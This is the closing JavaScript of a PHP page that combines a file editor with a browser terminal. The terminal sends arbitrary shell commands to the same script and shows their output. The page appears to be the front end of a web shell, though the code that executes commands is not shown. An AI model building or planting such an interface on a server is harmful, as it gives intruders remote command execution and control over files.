function initAceEditor(content) {
    window.aceEditor = ace.edit('ace-editor');
    window.aceEditor.setTheme('ace/theme/crimson_editor');
    window.aceEditor.session.setMode('ace/mode/php');
    window.aceEditor.setOptions({
        fontSize: '14px',
        showPrintMargin: false,
        wrap: true,
        showLineNumbers: true,
        highlightActiveLine: true,
        showGutter: true,
        tabSize: 4
    });
    window.aceEditor.setValue(content, 1);
    window.aceEditor.session.setUseWorker(false);
}

function saveFileSimple(filename) {
    var content = window.aceEditor ? window.aceEditor.getValue() : document.getElementById('file-content').value;
    var newFilename = document.querySelector('.edit-modal input[type="text"]').value || filename;
    var button = document.querySelector('.edit-modal button[type="submit"]');
    
    button.disabled = true;
    button.textContent = 'Saving...';
    
    var formData = new FormData();
    formData.append('ajax', 'save');
    formData.append('file', newFilename);
    formData.append('content', content);
    formData.append('d', '<?php echo $d; ?>');
    
    fetch('<?php echo $me; ?>', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if(data.success) {
            // Keep modal open, just show success
                    button.disabled = false;
            button.textContent = 'Save';
            button.style.background = '#90EE90';
            button.style.color = '#000';
            setTimeout(function() {
                button.style.background = '#eaeaea';
                button.style.color = '#000';
            }, 1000);
        } else {
            alert('Error: ' + data.message);
            button.disabled = false;
            button.textContent = 'Save';
        }
    })
    .catch(error => {
        alert('Error: ' + error);
        button.disabled = false;
        button.textContent = 'Save';
    });
    
    return false;
}

var commandHistory = [];
var historyIndex = -1;

function toggleTerminal() {
    var panel = document.getElementById('terminalPanel');
    if(panel.style.display === 'none' || panel.style.display === '') {
        panel.style.display = 'block';
        document.getElementById('terminalInput').focus();
        addToTerminal('Terminal opened. Current directory: <?php echo htmlspecialchars($d); ?>\n');
    } else {
        panel.style.display = 'none';
    }
}

function clearTerminal() {
    document.getElementById('terminalOutput').innerHTML = '';
}

function addToTerminal(text) {
    var output = document.getElementById('terminalOutput');
    output.innerHTML += text;
    output.scrollTop = output.scrollHeight;
}

document.addEventListener('keydown', function(e) {
    if(e.key === 'Escape') {
        var modal = document.querySelector('.edit-modal');
        if(modal) {
            closeModal();
            e.preventDefault();
        }
        var terminal = document.getElementById('terminalPanel');
        if(terminal && terminal.style.display === 'block') {
            toggleTerminal();
            e.preventDefault();
        }
    }
    
    if(e.ctrlKey && e.key === 'a' && !e.target.matches('input, textarea')) {
        var selectAll = document.getElementById('selectAll');
        if(selectAll) {
            selectAll.checked = true;
            toggleSelectAll(selectAll);
            e.preventDefault();
        }
    }
    
    if(e.key === 'Delete' && !e.target.matches('input, textarea')) {
        var checkedBoxes = document.querySelectorAll('tbody input[type="checkbox"]:checked');
        if(checkedBoxes.length > 0) {
            deleteSelected();
            e.preventDefault();
        }
    }
});

document.addEventListener('DOMContentLoaded', function() {
    var terminalForm = document.getElementById('terminalForm');
    var terminalInput = document.getElementById('terminalInput');
    
    terminalForm.addEventListener('submit', function(e) {
        e.preventDefault();
        var command = terminalInput.value.trim();
        if(command === '') return;
        
        commandHistory.push(command);
        historyIndex = commandHistory.length;
        
        addToTerminal('$ ' + command + '\n');
        
        var loadingDiv = document.createElement('div');
        loadingDiv.id = 'terminal-loading';
        loadingDiv.style.cssText = 'color:#abb2bf;margin:5px 0;';
        loadingDiv.innerHTML = '<span style="animation:spin 1s linear infinite;display:inline-block;">⏳</span> Running command...';
        document.getElementById('terminalOutput').appendChild(loadingDiv);
        
        
        var formData = new FormData();
        formData.append('cmd', command);
        
        fetch('<?php echo $me; ?>?d=<?php echo urlencode($d); ?>', {
            method: 'POST',
            body: formData
        })
        .then(response => response.text())
        .then(data => {
            var loading = document.getElementById('terminal-loading');
            if(loading) loading.remove();
            
            addToTerminal(data + '\n');
        })
        .catch(error => {
            var loading = document.getElementById('terminal-loading');
            if(loading) loading.remove();
            
            addToTerminal('Error: ' + error + '\n');
        });
        
        terminalInput.value = '';
    });
    
    terminalInput.addEventListener('keydown', function(e) {
        if(e.key === 'ArrowUp') {
            e.preventDefault();
            if(historyIndex > 0) {
                historyIndex--;
                terminalInput.value = commandHistory[historyIndex];
            }
        } else if(e.key === 'ArrowDown') {
            e.preventDefault();
            if(historyIndex < commandHistory.length - 1) {
                historyIndex++;
                terminalInput.value = commandHistory[historyIndex];
            } else {
                historyIndex = commandHistory.length;
                terminalInput.value = '';
            }
        }
    });
});

</script>

</body>
</html>